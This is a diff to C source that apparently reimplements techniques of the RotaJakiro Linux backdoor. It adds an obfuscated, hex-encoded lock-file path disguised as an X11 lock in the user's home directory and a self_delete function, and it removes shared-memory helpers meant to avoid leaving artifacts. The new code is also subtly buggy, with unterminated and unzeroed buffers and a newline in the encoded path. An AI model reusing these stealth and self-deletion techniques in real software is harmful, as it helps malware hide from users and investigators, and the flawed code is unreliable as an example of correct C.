@@ -2,13 +2,16 @@
 
 #include <stdbool.h>
 #include <stdlib.h>
+#include <strings.h>
 #include <stdio.h>
 #include <string.h>
 #include <fcntl.h>
 #include <sys/stat.h>
 #include <sys/shm.h>
 #include <sys/mman.h>
+#include <sys/file.h>
 #include <unistd.h>
+#include <errno.h>
 
 /**
  * Create a lock file to ensure one instance is running.
@@ -17,25 +20,54 @@
  * @return void
  * */
 void create_lock() {
+
+    // /.X11/X0-lock
+    char x11_lock_file [14] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x58,0x30,0x2d,0x6c,0x6f,0x63,0x6b,0xa};
+    char *HOME = getenv("HOME");
+
+    // $HOME/.X11/x0-lock
+    int fpath_size = strlen(HOME) + strlen(x11_lock_file);
+    char *flock_path = (char *)malloc(fpath_size);
+    strncat(flock_path, HOME, strlen(HOME));
+    strncat(flock_path, x11_lock_file, strlen(x11_lock_file));
+
+    // create .X11 dir
+    char *x11dir= "/.X11";
+    int x11path_size = strlen(HOME) + strlen(x11dir);
+    char *dirpath = (char *)malloc(x11path_size);
+    bzero(dirpath, x11path_size);
+    strncat(dirpath, HOME, strlen(HOME));
+    strncat(dirpath, x11dir, strlen(x11dir));
+    if (access(dirpath, F_OK) == -1) {
+        mkdir(dirpath, 0755);
+    }
+
+    // create directory of .X11 if it does not exist
+    int fd = open(flock_path, O_CREAT);
+    if (fd > 0) {
+        flock(fd, LOCK_EX);
+    }
+
+    free(flock_path);
+    free(dirpath);
+    // lock file must already exist...
+    close(fd);
 }
 
 
-
 /**
- * wrapper function to create data from shared memory instance
- * Reference: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
- * @param identifier name of shared mem file.
- * @param size number of bytes to read.
- * */
-int shm_get(int identifier, int size) {
+ * @brief delete file based on fpath
+ * @param file path to delete
+ * @return boolean value indicating success/failure
+ **/
+bool self_delete(char *fpath) {
 
-    // NULL check
-    if (!identifier) {
-        return -1;
+    int res = unlink(fpath);
+    if (res < 0){
+        fprintf(stderr, "[self_delete] Error: %s\n", strerror(errno));
+        return false;
     }
-
-    // Note - this method *does not* create a file artifact in /dev/shm
-    return shmget(identifier, size, 0x3b6);
+    return true;
 }
 
 
@@ -64,12 +96,14 @@ char *copy_pid_from_shared_mem(uint size, char *fpath) {
     if (bytesRead != size) {
         free(tmpFileBuff);
         free(filePathBuff);
+        return NULL;
     }
 
     free(tmpFileBuff);
 
     return filePathBuff;
 }
+
 
 
 /**
@@ -80,7 +114,6 @@ char *copy_pid_from_shared_mem(uint size, char *fpath) {
  *
  * @return integer value
  * */
-
 bool write_to_file(char *fpath, char *data) {
 
     // TODO - double check file permissions
@@ -96,18 +129,4 @@ bool write_to_file(char *fpath, char *data) {
     }
 
     return false;
-}
-
-/**
- * Helper function to convert integer value to string value
- * - NOTE, don't forget to free this memory :)
- * @param num, integer value to convert.
- * @return point to char memory.
- * */
-char *itoa(int num) {
-
-    char *c_num = malloc(sizeof(num));
-    sprintf(c_num, "%d", num);
-
-    return c_num;
 }
